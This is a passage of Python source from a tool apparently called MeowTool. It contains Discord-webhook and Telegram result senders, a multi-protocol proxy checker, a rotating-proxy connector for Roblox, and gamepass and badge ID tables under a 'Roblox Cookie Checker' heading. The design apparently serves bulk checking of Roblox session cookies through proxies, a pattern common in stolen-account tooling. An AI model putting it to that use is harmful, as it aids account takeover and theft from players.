            sys.stdout.write(f'\r {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}{MT_Telegram[1]}{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.GREEN}{MT_Successfully}{ANSI.CLEAR + ANSI.DECOR.BOLD} | {MT_Message_Was_Sent} :3\n')
    except FileNotFoundError:
        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.RED}{MT_Telegram[1]}{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.RED}{MT_Unsuccessfully}{ANSI.CLEAR + ANSI.DECOR.BOLD} | {MT_File_Was_Not_Created}... :<\n')
    except (TelegramNetworkError, ClientConnectorDNSError):
        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.RED}{MT_Telegram[1]}{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.RED}{MT_Unsuccessfully}{ANSI.CLEAR + ANSI.DECOR.BOLD} | {MT_Possibly_The_Internet_Is_Unstable}... :<\n')
    except TelegramUnauthorizedError:
        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.RED}{MT_Telegram[1]}{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.RED}{MT_Unsuccessfully}{ANSI.CLEAR + ANSI.DECOR.BOLD} | {MT_Possibly_A_Typo_In_The_Bot_Token}... :<\n')
    except TelegramBadRequest:
        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.RED}{MT_Telegram[1]}{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.RED}{MT_Unsuccessfully}{ANSI.CLEAR + ANSI.DECOR.BOLD} | {MT_Possibly_A_Typo_In_The_Chat_ID}... :<\n')
    except Exception as e:
        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.RED}{MT_Telegram[1]}{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.RED}{MT_Unsuccessfully}{ANSI.CLEAR + ANSI.DECOR.BOLD} | {MT_Unknown_Error}: {e} :<\n')
    finally:
        sys.stdout.flush()
        await bot.session.close()

async def sendMessageDiscordWebhook(webhookURL: str, text: str = None, filePath: str = None, filename_: str = None):
    if len(webhookURL.split('/')) not in (7, 8):
        return sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.RED}{MT_Discord[1]}{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.RED}{MT_Unsuccessfully}{ANSI.CLEAR + ANSI.DECOR.BOLD} | {MT_Invalid_URL_Format}... :<\n')

    try:
        webhook = DiscordWebhook(
            url=webhookURL,
            rate_limit_retry=True
        )

        embed = DiscordEmbed(
            description=text,
            color="c883b3"
        )

        if not filePath:
            webhook.add_embed(embed)
            response = webhook.execute()
            sys.stdout.write(f'\r {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}{MT_Discord[1]}{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.GREEN}{MT_Successfully}{ANSI.CLEAR + ANSI.DECOR.BOLD} | {MT_Message_Was_Sent} :3\n')
            return

        if not os.path.exists(f'{filePath}\\{filename_}'):
            raise FileNotFoundError

        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}{MT_Discord[1]}{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Send[1]} {MT_Results_To_Discord[0].lower() + MT_Results_To_Discord[1:]}\r')
        sys.stdout.flush()

        embed.set_thumbnail(url='https://media.discordapp.net/attachments/1393994423481663528/1394053567899369533/Neko_for_MeowTool_Discord_output.png?ex=6875690e&is=6874178e&hm=b1570da0041dc8148f866cfa2c92cbf61d5d33177a534f63bb9965bcc6cc8d6c&=')
        webhook.add_embed(embed)

        with open(f'{filePath}\\{filename_}', 'rb') as f:
            webhook.add_file(file=f.read(), filename=filename_)

        response = webhook.execute()

        match response.status_code:
            case 200:
                sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}{MT_Discord[1]}{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.GREEN}{MT_Successfully}{ANSI.CLEAR + ANSI.DECOR.BOLD} | {MT_Send[2]} {MT_Results_To_Discord[0].lower() + MT_Results_To_Discord[1:]} :3\n')
            case 401 | 404:
                await removeLines(1)
                sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.RED}{MT_Discord[1]}{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.RED}{MT_Unsuccessfully}{ANSI.CLEAR + ANSI.DECOR.BOLD} | {MT_Possibly_A_Typo_In_The_Webhook_URL}... :<\n')
            case _:
                await removeLines(1)
                sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.RED}{MT_Discord[1]}{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.RED}{MT_Unsuccessfully}{ANSI.CLEAR + ANSI.DECOR.BOLD} | {MT_Unknown_Server_Response_Code}: {response.status_code}... :<\n')
    except FileNotFoundError:
        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.RED}{MT_Discord[1]}{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.RED}{MT_Unsuccessfully}{ANSI.CLEAR + ANSI.DECOR.BOLD} | {MT_File_Was_Not_Created}... :<\n')
    except requests.exceptions.ConnectionError:
        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.RED}{MT_Discord[1]}{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.RED}{MT_Unsuccessfully}{ANSI.CLEAR + ANSI.DECOR.BOLD} | {MT_Possibly_The_Internet_Is_Unstable}... :<\n')
    except requests.exceptions.MissingSchema:
        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.RED}{MT_Discord[1]}{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.RED}{MT_Unsuccessfully}{ANSI.CLEAR + ANSI.DECOR.BOLD} | {MT_Invalid_URL_Format}... :<\n')
    except Exception as e:
        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.RED}{MT_Discord[1]}{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.RED}{MT_Unsuccessfully}{ANSI.CLEAR + ANSI.DECOR.BOLD} | {MT_Unknown_Error}: {e} :<\n')
    finally:
        sys.stdout.flush()

### Proxy Checker

async def proxyChecker(fileName: str): # http, socks4, socks5
    await removeLines(15)
    sys.stdout.write(f'\n {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}~{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Start_Checking_File} \'{ANSI.DECOR.UNDERLINE1}{fileName}.txt{ANSI.CLEAR + ANSI.DECOR.BOLD}\':\n')

    if not os.path.exists(f'Proxy\\Checker\\{fileName}.txt'):
        return await errorOrCorrectHandler(True, MT_No_Proxy_Was_Found, f'{MT_Proxy}\\{MT_Checker}')

    with open(f'Proxy\\Checker\\{fileName}.txt', 'r', encoding='UTF-8', errors='ignore') as f:
        proxyList = list({line.strip() for line in f
                          if line.strip() != ''})

    if not proxyList:
        return await errorOrCorrectHandler(True, MT_No_Proxy_Was_Found, f'{MT_Proxy}\\{MT_Checker}')

    def proxySave(protocol = '', protocolUpper = '', filename = '', validity = '', proxy = '', color = '', goodbad = ''):
        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{color}>{ANSI.CLEAR + ANSI.DECOR.BOLD}] {proxyCount} {MT_Of} {len(proxyList)} ┃ {ANSI.FG.CYAN}[{protocolUpper}] {ANSI.CLEAR + ANSI.DECOR.BOLD + color}[{goodbad}] {proxy.strip()}{ANSI.CLEAR}\n')
        with open(f'Proxy\\Checker\\{filename}_{validity}.txt', 'a+', encoding='UTF-8') as f:
            f.seek(0)
            if f'{protocol}{proxy}' not in f.read():
                f.write(f'{protocol}{proxy.replace('\n', '')}\n')

    def unknownProxySave(protocol: str, filename: str, validity: str, proxy: str):
        with open(f'Proxy\\Checker\\{filename}_{validity}.txt', 'a+', encoding='UTF-8') as f:
            f.seek(0)
            if f'{protocol}{proxy}' not in f.read():
                f.write(f'{protocol}{proxy.replace('\n', '')}\n')

    timeoutProxy = config['Proxy']['Checker']['Timeout'] if str(config['Proxy']['Checker']['Timeout']).isdigit() and 0 < config['Proxy']['Checker']['Timeout'] <= 3600 else 3
    proxyCount = 0
    resetProxySocks = socket.socket
        
    for proxy in proxyList:
        if 'http://' in proxy or 'https://' in proxy: # http / https
            proxy = proxy.replace('http://', '').replace('https://', '')
            
            try:
                if len(proxy.split(':')) == 4:
                    ip, port, username, password = proxy.strip().split(':')
                    HTTPproxies = {
                        'http':  f'http://{username}:{password}@{ip}:{port}',
                        'https': f'https://{username}:{password}@{ip}:{port}'
                    }
                else:
                    ip, port = proxy.strip().split(':')
                    HTTPproxies = {
                        'http':  f'http://{ip}:{port}',
                        'https': f'https://{ip}:{port}'
                    }
                
                response = requests.get('http://ipinfo.io/json', proxies=HTTPproxies, timeout=timeoutProxy)
                
                if response.status_code >= 200 and response.status_code < 300:
                    proxyCount += 1
                    if   config['Proxy']['Checker']['Save_In_Custom_Folder'] and config['Proxy']['Checker']['Save_Without_Protocol']: proxySave('',        'H', 'custom', 'valid', proxy, ANSI.FG.GREEN, 'GOOD')
                    elif config['Proxy']['Checker']['Save_In_Custom_Folder']:                                                         proxySave('http://', 'H', 'custom', 'valid', proxy, ANSI.FG.GREEN, 'GOOD')
                    elif config['Proxy']['Checker']['Save_Without_Protocol']:                                                         proxySave('',        'H', 'http',   'valid', proxy, ANSI.FG.GREEN, 'GOOD')
                    else:                                                                                                             proxySave('http://', 'H', 'http',   'valid', proxy, ANSI.FG.GREEN, 'GOOD')
                else:
                    proxyCount += 1
                    if config['Proxy']['Checker']['Save_Without_Protocol']: proxySave('',        'H', 'http', 'invalid', proxy, ANSI.FG.RED, 'BAD')
                    else:                                                   proxySave('http://', 'H', 'http', 'invalid', proxy, ANSI.FG.RED, 'BAD')
            except requests.RequestException:
                proxyCount += 1
                if config['Proxy']['Checker']['Save_Without_Protocol']: proxySave('',        'H', 'http', 'invalid', proxy, ANSI.FG.RED, 'BAD')
                else:                                                   proxySave('http://', 'H', 'http', 'invalid', proxy, ANSI.FG.RED, 'BAD')
            except Exception:
                pass
        elif 'socks4://' in proxy: # socks4
            proxy = proxy.replace('socks4://', '')
            try:
                if len(proxy.split(':')) == 4:
                    ip, port, username, password = proxy.strip().split(':')
                    socks.set_default_proxy(proxy_type=socks.SOCKS4, addr=ip, port=int(port), username=username, password=password)
                else:
                    ip, port = proxy.strip().split(':')
                    socks.set_default_proxy(proxy_type=socks.SOCKS4, addr=ip, port=int(port))
                socket.socket = socks.socksocket
                response = requests.get('http://ipinfo.io/json', timeout=timeoutProxy)
                if response.status_code >= 200 and response.status_code < 300:
                    proxyCount += 1
                    if   config['Proxy']['Checker']['Save_In_Custom_Folder'] and config['Proxy']['Checker']['Save_Without_Protocol']: proxySave('',          'S4', 'custom', 'valid', proxy, ANSI.FG.GREEN, 'GOOD')
                    elif config['Proxy']['Checker']['Save_In_Custom_Folder']:                                                         proxySave('socks4://', 'S4', 'custom', 'valid', proxy, ANSI.FG.GREEN, 'GOOD')
                    elif config['Proxy']['Checker']['Save_Without_Protocol']:                                                         proxySave('',          'S4', 'socks4', 'valid', proxy, ANSI.FG.GREEN, 'GOOD')
                    else:                                                                                                             proxySave('socks4://', 'S4', 'socks4', 'valid', proxy, ANSI.FG.GREEN, 'GOOD')
                else:
                    proxyCount += 1
                    if config['Proxy']['Checker']['Save_Without_Protocol']: proxySave('',          'S4', 'socks4', 'invalid', proxy, ANSI.FG.RED, 'BAD')
                    else:                                                   proxySave('socks4://', 'S4', 'socks4', 'invalid', proxy, ANSI.FG.RED, 'BAD')
            except requests.RequestException:
                proxyCount += 1
                if config['Proxy']['Checker']['Save_Without_Protocol']: proxySave('',          'S4', 'socks4', 'invalid', proxy, ANSI.FG.RED, 'BAD')
                else:                                                   proxySave('socks4://', 'S4', 'socks4', 'invalid', proxy, ANSI.FG.RED, 'BAD')
            except Exception:
                pass
        elif 'socks5://' in proxy: # socks5
            proxy = proxy.replace('socks5://', '')
            try:
                if len(proxy.split(':')) == 4:
                    ip, port, username, password = proxy.strip().split(':')
                    socks.set_default_proxy(proxy_type=socks.SOCKS5, addr=ip, port=int(port), username=username, password=password)
                else:
                    ip, port = proxy.strip().split(':')
                    socks.set_default_proxy(proxy_type=socks.SOCKS5, addr=ip, port=int(port))
                socket.socket = socks.socksocket
                response = requests.get('http://ipinfo.io/json', timeout=timeoutProxy)
                if response.status_code >= 200 and response.status_code < 300:
                    proxyCount += 1
                    if   config['Proxy']['Checker']['Save_In_Custom_Folder'] and config['Proxy']['Checker']['Save_Without_Protocol']: proxySave('',          'S5', 'custom', 'valid', proxy, ANSI.FG.GREEN, 'GOOD')
                    elif config['Proxy']['Checker']['Save_In_Custom_Folder']:                                                         proxySave('socks5://', 'S5', 'custom', 'valid', proxy, ANSI.FG.GREEN, 'GOOD')
                    elif config['Proxy']['Checker']['Save_Without_Protocol']:                                                         proxySave('',          'S5', 'socks5', 'valid', proxy, ANSI.FG.GREEN, 'GOOD')
                    else:                                                                                                             proxySave('socks5://', 'S5', 'socks5', 'valid', proxy, ANSI.FG.GREEN, 'GOOD')
                else:
                    proxyCount += 1
                    if config['Proxy']['Checker']['Save_Without_Protocol']: proxySave('',          'S5', 'socks5', 'invalid', proxy, ANSI.FG.RED, 'BAD')
                    else:                                                   proxySave('socks5://', 'S5', 'socks5', 'invalid', proxy, ANSI.FG.RED, 'BAD')
            except requests.RequestException:
                proxyCount += 1
                if config['Proxy']['Checker']['Save_Without_Protocol']: proxySave('',          'S5', 'socks5', 'invalid', proxy, ANSI.FG.RED, 'BAD')
                else:                                                   proxySave('socks5://', 'S5', 'socks5', 'invalid', proxy, ANSI.FG.RED, 'BAD')
            except Exception:
                pass
        else:
            try:
                list_types = []

                try: # http / https
                    if len(proxy.split(':')) == 4:
                        ip, port, username, password = proxy.strip().split(':')
                        HTTPproxies = {
                            'http': f'http://{username}:{password}@{ip}:{port}',
                            'https': f'https://{username}:{password}@{ip}:{port}'
                        }
                    else:
                        ip, port = proxy.strip().split(':')
                        HTTPproxies = {
                            'http': f'http://{ip}:{port}',
                            'https': f'https://{ip}:{port}'
                        }

                    response = requests.get('http://ipinfo.io/json', proxies=HTTPproxies, timeout=timeoutProxy)
                    if response.status_code >= 200 and response.status_code < 300:
                        list_types.append('H')
                except Exception:
                    pass

                try: # socks4
                    if len(proxy.split(':')) == 4:
                        ip, port, username, password = proxy.strip().split(':')
                        socks.set_default_proxy(proxy_type=socks.SOCKS4, addr=ip, port=int(port), username=username, password=password)
                    else:
                        ip, port = proxy.strip().split(':')
                        socks.set_default_proxy(proxy_type=socks.SOCKS4, addr=ip, port=int(port))
                    socket.socket = socks.socksocket
                    response = requests.get('http://ipinfo.io/json', timeout=timeoutProxy)
                    if response.status_code >= 200 and response.status_code < 300:
                        list_types.append('S4')
                    socket.socket = resetProxySocks
                except Exception:
                    pass

                try: # socks5
                    if len(proxy.split(':')) == 4:
                        ip, port, username, password = proxy.strip().split(':')
                        socks.set_default_proxy(proxy_type=socks.SOCKS5, addr=ip, port=int(port), username=username, password=password)
                    else:
                        ip, port = proxy.strip().split(':')
                        socks.set_default_proxy(proxy_type=socks.SOCKS5, addr=ip, port=int(port))
                    socket.socket = socks.socksocket
                    response = requests.get('http://ipinfo.io/json', timeout=timeoutProxy)
                    if response.status_code >= 200 and response.status_code < 300:
                        list_types.append('S5')
                    socket.socket = resetProxySocks
                except Exception:
                    pass

                if len(list_types) > 0:
                    proxyCount += 1
                    sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}>{ANSI.CLEAR + ANSI.DECOR.BOLD}] {str(proxyCount)} {MT_Of} {len(proxyList)} ┃ {ANSI.FG.CYAN}[{'/'.join(list_types)}] {ANSI.CLEAR + ANSI.DECOR.BOLD + ANSI.FG.GREEN}[GOOD] {proxy}{ANSI.CLEAR}')
                    if 'H' in list_types:
                        if   config['Proxy']['Checker']['Save_In_Custom_Folder'] and config['Proxy']['Checker']['Save_Without_Protocol']: unknownProxySave('',          'custom', 'valid', proxy)
                        elif config['Proxy']['Checker']['Save_In_Custom_Folder']:                                                         unknownProxySave('http://',   'custom', 'valid', proxy)
                        elif config['Proxy']['Checker']['Save_Without_Protocol']:                                                         unknownProxySave('',          'http',   'valid', proxy)
                        else:                                                                                                             unknownProxySave('http://',   'http',   'valid', proxy)
                    if 'S4' in list_types:
                        if   config['Proxy']['Checker']['Save_In_Custom_Folder'] and config['Proxy']['Checker']['Save_Without_Protocol']: unknownProxySave('',          'custom', 'valid', proxy)
                        elif config['Proxy']['Checker']['Save_In_Custom_Folder']:                                                         unknownProxySave('socks4://', 'custom', 'valid', proxy)
                        elif config['Proxy']['Checker']['Save_Without_Protocol']:                                                         unknownProxySave('',          'socks4', 'valid', proxy)
                        else:                                                                                                             unknownProxySave('socks4://', 'socks4', 'valid', proxy)
                    if 'S5' in list_types:
                        if   config['Proxy']['Checker']['Save_In_Custom_Folder'] and config['Proxy']['Checker']['Save_Without_Protocol']: unknownProxySave('',          'custom', 'valid', proxy)
                        elif config['Proxy']['Checker']['Save_In_Custom_Folder']:                                                         unknownProxySave('socks5://', 'custom', 'valid', proxy)
                        elif config['Proxy']['Checker']['Save_Without_Protocol']:                                                         unknownProxySave('',          'socks5', 'valid', proxy)
                        else:                                                                                                             unknownProxySave('socks5://', 'socks5', 'valid', proxy)
                elif len(list_types) == 0:
                    proxyCount += 1
                    proxySave('', 'UNK', 'unknown', 'invalid', proxy, ANSI.FG.RED, 'BAD')
            except requests.RequestException:
                proxyCount += 1
                proxySave('', 'UNK', 'unknown', 'invalid', proxy, ANSI.FG.RED, 'BAD')
        socket.socket = resetProxySocks

    # Выравнивание после проверки
    if len(proxyList) > 0 and proxyList[-1] not in ('\n', '', ' '):
        copyfile(f'Proxy\\Checker\\{fileName}.txt', f'Proxy\\Checker\\{fileName}_cached.txt')
        while proxyList[-1] not in ('\n', '', ' '):
            with open(f'Proxy\\Checker\\{fileName}_cached.txt', 'a', encoding='UTF-8', errors='ignore') as f:
                f.write('\n')
            proxyList = open(f'Proxy\\Checker\\{fileName}_cached.txt', 'r').readlines()
        os.remove(f'Proxy\\Checker\\{fileName}_cached.txt')

    sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}~{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Checking_Complete}\n\n')
    await waitingInput()

### Roblox

async def robloxGetConnector(category: str, proxies: list = None):
    if not proxies:
        return TCPConnector(limit=0)

    choosenProxy = choice(proxies)
    if '://' not in choosenProxy[0:9]:
        autoProtocol = config['Roblox'][category]['Proxy']['Auto_Protocol_If_Not_Specified']
        choosenProxy = f'{autoProtocol if autoProtocol in ('http', 'socks4', 'socks5') else 'http'}:{choosenProxy}'
    else:
        choosenProxy = str(choosenProxy).replace('https://', 'http:').replace('socks4://', 'socks4:').replace('socks5://', 'socks5:')

    protocol, ip, port, username, password = choosenProxy.split(':')

    return ProxyConnector.from_url(f'{protocol}://{username}:{password}@{ip}:{port}')

### Roblox Cookie Checker

class AUniversalTime: # https://www.roblox.com/games/5130598377
    placeNames = 'A Universal Time', 'A_Universal_Time', 'AUT', 5130598377
    class Gamepasses:
        Plus3StandStorageSlots = '3+ Stand Storage Slots', 10397197,  '3_Plus_Stand_Storage_Slots'
        Plus3BankSlotsStorage  = '3+ Bank Slots Storage',  10479192,  '3_Plus_Bank_Slots_Storage'
        ItemNotifier           = 'Item Notifier',          10562035,  'Item_Notifier'
        Donation               = 'Donation',               10753254,  'Donation'
        CustomChatColor        = 'Custom Chat Color',      11491183,  'Custom_Chat_Color'
        ChatBackgroundColor    = 'Chat Background Color',  11581293,  'Chat_Background_Color'
        EmotesPackv1           = 'Emotes Pack v1',         13675608,  'Emotes_Pack_v1'
        EmotePackv2            = 'Emote Pack v2',          14014491,  'Emote_Pack_v2'
        EmotePackv3            = 'Emote Pack v3',          822694616, 'Emote_Pack_v3'
        EmotePackv4            = 'Emote Pack v4',          822666635, 'Emote_Pack_v4'
        EmotePackv5            = 'Emote Pack v5',          837754540, 'Emote_Pack_v5'
        JJKEmotePack           = 'JJK Emote Pack',         920471052, 'JJK_Emote_Pack'
        SmartAssistant         = 'Smart Assistant',        939773206, 'Smart_Assistant'
        CommunityEmotePack     = 'Community Emote Pack',   948648926, 'Community_Emote_Pack'
        # List Of Gamepasses
        listOfGamepasses = [Plus3StandStorageSlots, Plus3BankSlotsStorage, ItemNotifier, Donation, CustomChatColor, ChatBackgroundColor, EmotesPackv1, EmotePackv2, EmotePackv3, EmotePackv4, EmotePackv5, JJKEmotePack, SmartAssistant, CommunityEmotePack]
    class Badges:
        AUTWinterXMas = 'AUT Winter/X-Mas', 2124647551,       'AUT_Winter_XMas'
        NewUniverse   = 'New Universe',     2124749486,       'New_Universe'
        AHauntingTime = 'A Haunting Time',  3072215579952874, 'A_Haunting_Time'
        AJollyTime    = 'A Jolly Time',     500904421623568,  'A_Jolly_Time'
        # List Of Badges
        listOfBadges = [AUTWinterXMas, NewUniverse, AHauntingTime, AJollyTime]

class AdoptMe: # https://www.roblox.com/games/920587237
    placeNames = 'Adopt Me', 'Adopt_Me', 'AM', 920587237
    class Gamepasses:
        VIP                     = 'VIP',                        3196348,   'VIP'
        Glider                  = 'Glider',                     3745845,   'Glider'
        StarterPack             = 'Starter Pack',               4785795,   'Starter_Pack'
        DJ                      = 'DJ',                         4796463,   'DJ'
        CandyCannon             = 'Candy Cannon',               5246776,   'Candy_Cannon'
        PremiumPlots            = 'Premium Plots',              5300198,   'Premium_Plots'
        PremiumFaces            = 'Premium Faces',              5704158,   'Premium_Faces'
        SupercarPack            = 'Supercar Pack',              5785139,   'Supercar_Pack'
        HeartHoverboard         = 'Heart Hoverboard',           5885873,   'Heart_Hoverboard'
        RoyalCarriages          = 'Royal Carriages',            5904007,   'Royal_Carriages'
        MillionairePack         = 'Millionaire Pack',           6040696,   'Millionaire_Pack'
        MermaidMansion          = 'Mermaid Mansion',            6164327,   'Mermaid_Mansion'
        CelebrityMansion        = 'Celebrity Mansion',          6408694,   'Celebrity_Mansion'
        PetHorse                = 'Pet Horse',                  6558811,   'Pet_Horse'
        PetGriffin              = 'Pet Griffin',                6558813,   'Pet_Griffin'
        LemonadeStand           = 'Lemonade Stand',             6858591,   'Lemonade_Stand'
        HotdogStand             = 'Hotdog Stand',               7124470,   'Hotdog_Stand'
        ModernMansion           = 'Modern Mansion',             6965379,   'Modern_Mansion'
        CozyHomeLure            = 'Cozy Home Lure',             189425850, 'Cozy_Home_Lure'
        SchoolandHospitalHomes  = 'School and Hospital Homes',  951065968, 'Schooland_Hospital_Homes'
        SoccerStadium           = 'Soccer Stadium',             951395729, 'Soccer_Stadium'
        FossilIsleReturnsBundle = 'Fossil Isle Returns Bundle', 951441773, 'Fossil_Isle_Returns_Bundle'
        # List Of Gamepasses
        listOfGamepasses = [VIP, Glider, StarterPack, DJ, CandyCannon, PremiumPlots, PremiumFaces, SupercarPack, HeartHoverboard, RoyalCarriages, MillionairePack, MermaidMansion, CelebrityMansion, PetHorse, PetGriffin, LemonadeStand, HotdogStand, ModernMansion, CozyHomeLure, SchoolandHospitalHomes, SoccerStadium, FossilIsleReturnsBundle]
    class Badges:
        TinyIsles                   = 'Tiny Isles',                            2124439922,       'Tiny_Isles'
        AncientRuins                = 'Ancient Ruins',                         2124439923,       'Ancient_Ruins'
        CoastalClimb                = 'Coastal Climb',                         2124439924,       'Coastal_Climb'
        LonelyPeak                  = 'Lonely Peak',                           2124439925,       'Lonely_Peak'
        Miniworld                   = 'Miniworld',                             2124439926,       'Miniworld'
        Pyramid                     = 'Pyramid',                               2124439927,       'Pyramid'
        ShipwreckBay                = 'Shipwreck Bay',                         2124439928,       'Shipwreck_Bay'
        RobloxEggHunt2020           = 'Roblox Egg Hunt 2020',                  2124520917,       'Roblox_Egg_Hunt_2020'
        RBBattlesChallenge          = 'RB Battles Challenge',                  2129488028,       'RB_Battles_Challenge'
        Unnamed                     = '???',                                   2129488030,       'Unnamed'
        Garden                      = 'Garden',                                135520552767917,  'Garden'
        RobloxTheGamesAdoptMeQuest1 = 'Roblox The Games: Adopt Me! - Quest 1', 1048893619880427, 'Roblox_The_Games_Adopt_Me_Quest_1'
        RobloxTheGamesAdoptMeQuest2 = 'Roblox The Games: Adopt Me! - Quest 2', 763171671267524,  'Roblox_The_Games_Adopt_Me_Quest_2'
        RobloxTheGamesAdoptMeQuest3 = 'Roblox The Games: Adopt Me! - Quest 3', 925260774262149,  'Roblox_The_Games_Adopt_Me_Quest_3'
        RobloxTheGamesAdoptMeShine1 = 'Roblox The Games: Adopt Me! - Shine 1', 89650026776535,   'Roblox_The_Games_Adopt_Me_Shine_1'
        RobloxTheGamesAdoptMeShine2 = 'Roblox The Games: Adopt Me! - Shine 2', 292596439745713,  'Roblox_The_Games_Adopt_Me_Shine_2'
        RobloxTheGamesAdoptMeShine3 = 'Roblox The Games: Adopt Me! - Shine 3', 1683279614525471, 'Roblox_The_Games_Adopt_Me_Shine_3'
        RobloxTheGamesAdoptMeShine4 = 'Roblox The Games: Adopt Me! - Shine 4', 1065569517641022, 'Roblox_The_Games_Adopt_Me_Shine_4'
        RobloxTheGamesAdoptMeShine5 = 'Roblox The Games: Adopt Me! - Shine 5', 3865916040798951, 'Roblox_The_Games_Adopt_Me_Shine_5'
        HunterBadge                 = 'Hunter Badge',                          160677344563654,  'Hunter_Badge'
        WhereBearBadge              = 'Where Bear? Badge',                     211728180632535,  'Where_Bear_Badge'
        SurvivorBadge               = 'Survivor Badge',                        639601989428398,  'Survivor_Badge'
        # List Of Badges
        listOfBadges = [TinyIsles, AncientRuins, CoastalClimb, LonelyPeak, Miniworld, Pyramid, ShipwreckBay, RobloxEggHunt2020, RBBattlesChallenge, Unnamed, Garden, RobloxTheGamesAdoptMeQuest1, RobloxTheGamesAdoptMeQuest2, RobloxTheGamesAdoptMeQuest3, RobloxTheGamesAdoptMeShine1, RobloxTheGamesAdoptMeShine2, RobloxTheGamesAdoptMeShine3, RobloxTheGamesAdoptMeShine4, RobloxTheGamesAdoptMeShine5, HunterBadge, WhereBearBadge, SurvivorBadge]

class AnimeAdventures: # https://www.roblox.com/games/8304191830
    placeNames = 'Anime Adventures', 'Anime_Adventures', 'AA', 8304191830
    class Gamepasses:
        VIP             = 'VIP',               55372677, 'VIP'
        ShinyHunter     = 'Shiny Hunter',      55373046, 'Shiny_Hunter'
        UnitStorage     = 'Unit Storage',      55373124, 'Unit_Storage'
        Display3Units   = 'Display 3 Units',   55373224, 'Display_3_Units'
        DisplayAllUnits = 'Display All Units', 99127218, 'Display_All_Units'
        # List Of Gamepasses
        listOfGamepasses = [VIP, ShinyHunter, UnitStorage, Display3Units, DisplayAllUnits]

class AnimeDefenders: # https://www.roblox.com/games/17017769292
    placeNames = 'Anime Defenders', 'Anime_Defenders', 'AD', 17017769292
    class Gamepasses:
        VIP                    = 'VIP',                      812679198,  'VIP'
        ShinyHunter            = 'Shiny Hunter',             812891077,  'Shiny_Hunter'
        MoreBoothSpace         = 'More Booth Space',         812985318,  'More_Booth_Space'
        DivineDragonBattlepass = 'Divine Dragon Battlepass', 857122763,  'Divine_Dragon_Battlepass'
        AthenyxsBattlepass     = 'Athenyx\'s Battlepass',    895533720,  'Athenyxs_Battlepass'
        x3Speed                = '3x Speed',                 903541948,  '3x_Speed'
        x50Unboxing            = '50x Unboxing',             903895415,  '50x_Unboxing'
        ChristmasBattlepass    = 'Christmas Battlepass',     1004747738, 'Christmas_Battlepass'
        # List Of Gamepasses
        listOfGamepasses = [VIP, ShinyHunter, MoreBoothSpace, DivineDragonBattlepass, AthenyxsBattlepass, x3Speed, x50Unboxing, ChristmasBattlepass]

class AnimeVanguards: # https://www.roblox.com/games/16146832113
    placeNames = 'Anime Vanguards', 'Anime_Vanguards', 'AV', 16146832113
    class Gamepasses:
        AnimeVanguardsTester = 'Anime Vanguards Tester', 780911708, 'Anime_Vanguards_Tester'
        ExtraUnitStorage     = 'Extra Unit Storage',     842367966, 'Extra_Unit_Storage'
        VIP                  = 'VIP',                    843295206, 'VIP'
        ShinyHunter          = 'Shiny Hunter',           846032291, 'Shiny_Hunter'
        DisplayAllUnits      = 'Display All Units',      846695813, 'Display_All_Units'
        # List Of Gamepasses
        listOfGamepasses = [AnimeVanguardsTester, ExtraUnitStorage, VIP, ShinyHunter, DisplayAllUnits]


class BeeSwarmSimulator: # https://www.roblox.com/games/1537690962
    placeNames = 'Bee Swarm Simulator', 'Bee_Swarm_Simulator', 'BSS', 1537690962
    class Gamepasses:
        x2ConvertSpeed    = 'x2 Convert Speed',     4231119, 'x2_Convert_Speed'
        x2BeeGatherPollen = 'x2 Bee Gather Pollen', 4231126, 'x2_BeeGather_Pollen'
        BearBee           = 'Bear Bee',             4257788, 'Bear_Bee'
        x2TicketChance    = 'x2 Ticket Chance',     4492467, 'x2_Ticket_Chance'
        # List Of Gamepasses
        listOfGamepasses = [x2ConvertSpeed, x2BeeGatherPollen, BearBee, x2TicketChance]
    class Badges:
        YouPlayedBeeSwarmSimulator = 'You Played Bee Swarm Simulator!', 2124634293, 'You_Played_Bee_Swarm_Simulator'
        SwarmingEggOfTheHive       = 'Swarming Egg Of The Hive',        2124520746, 'Swarming_Egg_Of_The_Hive'
        BeesmasBeeliever           = 'Beesmas Beeliever',               2124445684, 'Beesmas_Beeliever'
        BeesmasOverachiever        = 'Beesmas Overachiever',            2124445842, 'Beesmas_Overachiever'
